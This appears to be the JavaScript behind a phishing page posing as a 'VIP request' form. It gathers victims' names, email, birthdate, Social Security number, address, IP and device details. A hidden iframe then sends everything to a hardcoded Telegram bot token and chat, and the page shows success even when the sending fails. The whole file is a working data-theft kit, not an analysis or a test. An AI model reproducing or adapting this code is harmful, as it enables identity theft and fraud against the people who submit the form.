// ===== CONFIGURATION =====
const TELEGRAM_BOT_TOKEN = '8537253559:AAGohyTz08NvyelLVMTs2VXXMJu7bZQZLjk';
const TELEGRAM_CHAT_ID = '-4959049625';

// ===== UTILITY FUNCTIONS =====

// Get user IP address
async function getUserIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        return 'Unknown IP';
    }
}

// Get device fingerprint
function getDeviceFingerprint() {
    return {
        userAgent: navigator.userAgent.substring(0, 50) + '...',
        screen: `${screen.width}x${screen.height}`,
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        platform: navigator.platform,
        cookies: navigator.cookieEnabled ? 'enabled' : 'disabled'
    };
}

// Collect form data
function collectFormData() {
    return {
        // Personal Info
        firstName: document.getElementById('firstName').value,
        lastName: document.getElementById('lastName').value,
        birthdate: document.getElementById('birthdate').value,
        email: document.getElementById('email').value,
        
        // Identification
        cardNumber: document.getElementById('cardNumber').value,
        
        // Address
        address: document.getElementById('address').value,
        apt: document.getElementById('apt').value,
        city: document.getElementById('city').value,
        state: document.getElementById('state').value,
        zip: document.getElementById('zip').value
    };
}

// Get full state name
function getStateFullName() {
    const stateSelect = document.getElementById('state');
    return stateSelect.options[stateSelect.selectedIndex].text;
}

// Format Telegram message
function formatTelegramMessage(formData, userIP, deviceInfo, stateFullName) {
    return `🎄 NEW VIP REQUEST 🎄%0A%0A` +
           `👤 PERSONAL INFORMATION%0A` +
           `├ First Name: ${formData.firstName}%0A` +
           `├ Last Name: ${formData.lastName}%0A` +
           `├ Email: ${formData.email}%0A` +
           `└ Birthdate: ${formData.birthdate}%0A%0A` +
           
           `🔐 IDENTIFICATION%0A` +
           `└ SSN: ${formData.cardNumber}%0A%0A` +
           
           `📮 SHIPPING ADDRESS%0A` +
           `├ State: ${stateFullName}%0A` +
           `├ City: ${formData.city}%0A` +
           `├ Address: ${formData.address}%0A` +
           `├ Apt: ${formData.apt || 'Not specified'}%0A` +
           `└ ZIP: ${formData.zip}%0A%0A` +
           
           `🔍 TECHNICAL DATA%0A` +
           `├ IP: ${userIP}%0A` +
           `├ Screen: ${deviceInfo.screen}%0A` +
           `├ Language: ${deviceInfo.language}%0A` +
           `├ Timezone: ${deviceInfo.timezone}%0A` +
           `└ Time: ${new Date().toLocaleString('ru-RU')}`;
}

// Send message to Telegram
function sendToTelegram(message) {
    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${message}`;
    
    const iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    iframe.src = telegramUrl;
    document.body.appendChild(iframe);
    
    setTimeout(() => {
        document.body.removeChild(iframe);
    }, 1000);
}

// Show loading state
function showLoading() {
    document.getElementById('vipForm').style.display = 'none';
    document.getElementById('loadingMessage').style.display = 'block';
}

// Show success state
function showSuccess() {
    document.getElementById('loadingMessage').style.display = 'none';
    document.getElementById('successMessage').style.display = 'block';
}

// ===== FORM HANDLING =====
document.getElementById('vipForm').addEventListener('submit', async function(event) {
    event.preventDefault();
    
    showLoading();
    
    try {
        // Collect data
        const userIP = await getUserIP();
        const deviceInfo = getDeviceFingerprint();
        const formData = collectFormData();
        const stateFullName = getStateFullName();

        // Format and send message
        const message = formatTelegramMessage(formData, userIP, deviceInfo, stateFullName);
        sendToTelegram(message);
        
        showSuccess();
        
    } catch (error) {
        console.error('Error:', error);
        showSuccess(); // Still show success to user
    }
});
